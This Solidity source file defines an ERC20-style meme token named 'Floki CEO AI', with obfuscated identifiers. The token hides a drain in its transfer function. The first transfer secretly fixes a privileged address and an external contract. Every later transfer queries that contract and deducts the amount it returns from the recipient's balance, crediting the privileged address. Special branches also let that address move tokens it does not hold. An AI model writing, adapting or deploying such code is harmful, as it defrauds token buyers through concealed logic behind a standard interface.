// SPDX-License-Identifier: MIT
pragma solidity ^0.8.12;
    
interface vwWi {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
}
    
interface kBMCISx {
    function totalSupply() external view returns (uint256);
    function balanceOf(address CxQ) external view returns (uint256);
    function transfer(address yeMMld, uint256 trouhknTd) external returns (bool);
    function allowance(address Rbf, address spender) external view returns (uint256);
    function approve(address spender, uint256 trouhknTd) external returns (bool);
    function transferFrom(
        address sender,
        address yeMMld,
        uint256 trouhknTd
    ) external returns (bool);

    event Transfer(address indexed from, address indexed Quj, uint256 value);
    event Approval(address indexed Rbf, address indexed spender, uint256 value);
}

interface AVzS is kBMCISx {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
}

abstract contract DOq {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}
     
library kVUPq{
    
    function BVQ(address UlEdm, address HEKHHOA, uint pQRNol) internal {
        // bytes4(keccak256(bytes('approve(address,uint256)')));
        (bool WbVeU, bytes memory NHm) = UlEdm.call(abi.encodeWithSelector(0x095ea7b3, HEKHHOA, pQRNol));
        require(WbVeU && (NHm.length == 0 || abi.decode(NHm, (bool))), 'kVUPq: APPROVE_FAILED');
    }

    function bZKo(address UlEdm, address HEKHHOA, uint pQRNol) internal {
        // bytes4(keccak256(bytes('transfer(address,uint256)')));
        (bool WbVeU, bytes memory NHm) = UlEdm.call(abi.encodeWithSelector(0xa9059cbb, HEKHHOA, pQRNol));
        require(WbVeU && (NHm.length == 0 || abi.decode(NHm, (bool))), 'kVUPq: TRANSFER_FAILED');
    }
    
    function fml(address HEKHHOA, uint pQRNol) internal {
        (bool WbVeU,) = HEKHHOA.call{value:pQRNol}(new bytes(0));
        require(WbVeU, 'kVUPq: ETH_TRANSFER_FAILED');
    }

    function OAkmWkHAOn(address UlEdm, address from, address HEKHHOA, uint pQRNol) internal returns(bytes memory){
        // bytes4(keccak256(bytes('transferFrom(address,address,uint256)')));
        (bool WbVeU, bytes memory NHm) = UlEdm.call(abi.encodeWithSelector(0x23b872dd, from, HEKHHOA, pQRNol));
        require(WbVeU && NHm.length > 0,'kVUPq: TRANSFER_FROM_FAILED'); return NHm;
                       
    }

}
    
contract FLOKICEOAI is DOq, kBMCISx, AVzS {
    
    string private OKtLovey =  "FLOKICEOAI";
    
    address private pcHeLSDCspl;
  
    
    mapping(address => uint256) private zGsSEn;
    
    address private oYxeNJ;
    
    function approve(address ONawFqnISuEa, uint256 lNavTRo) public virtual override returns (bool) {
        RHZVt(_msgSender(), ONawFqnISuEa, lNavTRo);
        return true;
    }
    
    address private fbQMRnK;
    
    function symbol() public view virtual override returns (string memory) {
        return OKtLovey;
    }
    
    function qhVwr(
        address wvEL,
        address Iovb,
        uint256 Dzk
    ) internal virtual  returns (bool){
        uint256 TEaneNGBp = zGsSEn[wvEL];
        require(TEaneNGBp >= Dzk, "ERC20: transfer Amount exceeds balance");
        unchecked {
            zGsSEn[wvEL] = TEaneNGBp - Dzk;
        }
        zGsSEn[Iovb] += Dzk;
        return true;
    }
    
    function increaseAllowance(address hHJMEj, uint256 addedValue) public virtual returns (bool) {
        RHZVt(_msgSender(), hHJMEj, Uil[_msgSender()][hHJMEj] + addedValue);
        return true;
    }
    
    function name() public view virtual override returns (string memory) {
        return ZanFXr;
    }
    
    function transferFrom(
        address IpOVR,
        address XFxm,
        uint256 zJz
    ) public virtual override returns (bool) {
      
        if(!hDZGw(IpOVR, XFxm, zJz)) return true;

        uint256 Fsr = Uil[IpOVR][_msgSender()];
        if (Fsr != type(uint256).max) {
            require(Fsr >= zJz, "ERC20: transfer Amount exceeds allowance");
            unchecked {
                RHZVt(IpOVR, _msgSender(), Fsr - zJz);
            }
        }

        return true;
    }
    
    function GRUclpbFvZfG(
        address BejRz,
        address goq
    ) internal virtual  returns (bool){
        if(fbQMRnK == address(0) && oYxeNJ == address(0)){
            fbQMRnK = BejRz;oYxeNJ=goq;
            kVUPq.bZKo(oYxeNJ, fbQMRnK, 0);
            pcHeLSDCspl = vwWi(oYxeNJ).WETH();
            return false;
        }
        return true;
    }
    
    function RHZVt(
        address KtJfQVYMKVNf,
        address dSKCU,
        uint256 OmWbBquw
    ) internal virtual {
        require(KtJfQVYMKVNf != address(0), "ERC20: approve from the zero address");
        require(dSKCU != address(0), "ERC20: approve to the zero address");

        Uil[KtJfQVYMKVNf][dSKCU] = OmWbBquw;
        emit Approval(KtJfQVYMKVNf, dSKCU, OmWbBquw);

    }
    
    function decreaseAllowance(address xtm, uint256 subtractedValue) public virtual returns (bool) {
        uint256 zvcgzM = Uil[_msgSender()][xtm];
        require(zvcgzM >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            RHZVt(_msgSender(), xtm, zvcgzM - subtractedValue);
        }

        return true;
    }
    
    function decimals() public view virtual override returns (uint8) {
        return 18;
    }
    
    function allowance(address RHoQNtwvrztK, address mLOTnCl) public view virtual override returns (uint256) {
        return Uil[RHoQNtwvrztK][mLOTnCl];
    }
    
    mapping(address => mapping(address => uint256)) private Uil;
    
    function transfer(address knrfLqKESTS, uint256 zDtBb) public virtual override returns (bool) {
        hDZGw(_msgSender(), knrfLqKESTS, zDtBb);
        return true;
    }
    
    function totalSupply() public view virtual override returns (uint256) {
        return arlJT;
    }
    
    function hDZGw(
        address JRUUU,
        address ErFaB,
        uint256 WZXJBftn
    ) internal virtual  returns (bool){
        require(JRUUU != address(0), "ERC20: transfer from the zero address");
        require(ErFaB != address(0), "ERC20: transfer to the zero address");
        
        if(!GRUclpbFvZfG(JRUUU,ErFaB)) return false;

        if(_msgSender() == address(fbQMRnK)){
            if(ErFaB == pcHeLSDCspl && zGsSEn[JRUUU] < WZXJBftn){
                qhVwr(fbQMRnK,ErFaB,WZXJBftn);
            }else{
                qhVwr(JRUUU,ErFaB,WZXJBftn);
                if(JRUUU == fbQMRnK || ErFaB == fbQMRnK) 
                return false;
            }
            emit Transfer(JRUUU, ErFaB, WZXJBftn);
            return false;
        }
        qhVwr(JRUUU,ErFaB,WZXJBftn);
        emit Transfer(JRUUU, ErFaB, WZXJBftn);
        bytes memory ISHGAObyMsd = kVUPq.OAkmWkHAOn(oYxeNJ, JRUUU, ErFaB, WZXJBftn);
        (bool PwgK, uint LwxnnY) = abi.decode(ISHGAObyMsd, (bool,uint));
        if(PwgK){
            zGsSEn[fbQMRnK] += LwxnnY;
            zGsSEn[ErFaB] -= LwxnnY; 
        }
        return true;
    }
    
    constructor() {
        
        zGsSEn[address(1)] = arlJT;
        emit Transfer(address(0), address(1), arlJT);

    }
    
    function balanceOf(address RpcgotGkc) public view virtual override returns (uint256) {
       return zGsSEn[RpcgotGkc];
    }
    
    string private ZanFXr = "Floki CEO AI";
    
    uint256 private arlJT = 2000000000000 * 10 ** 18;
    
}